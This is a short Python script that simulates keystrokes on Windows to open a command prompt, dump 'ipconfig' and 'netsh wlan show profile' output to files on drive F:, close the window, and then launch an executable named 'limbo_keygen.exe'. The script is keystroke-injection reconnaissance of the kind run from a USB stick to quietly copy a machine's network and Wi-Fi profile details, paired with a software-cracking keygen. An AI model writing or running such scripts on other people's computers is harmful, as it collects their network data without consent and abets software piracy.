import keyboard as k
import time as tm
import subprocess as sp

k.press_and_release("cmd+r")
tm.sleep(0.1)
k.write("cmd")
tm.sleep(0.1)
k.press_and_release("enter")
tm.sleep(1.5)
k.write("ipconfig > F:\config.txt")
tm.sleep(0.1)
k.press_and_release("enter")
tm.sleep(0.1)
k.write("netsh wlan show profile > F:\Profile.txt")
tm.sleep(0.1)
k.press_and_release("enter")
tm.sleep(0.1)
k.press_and_release("alt+f4")

sp.run([r"F:\My Stuff\Exe file\limbo_keygen.exe"])
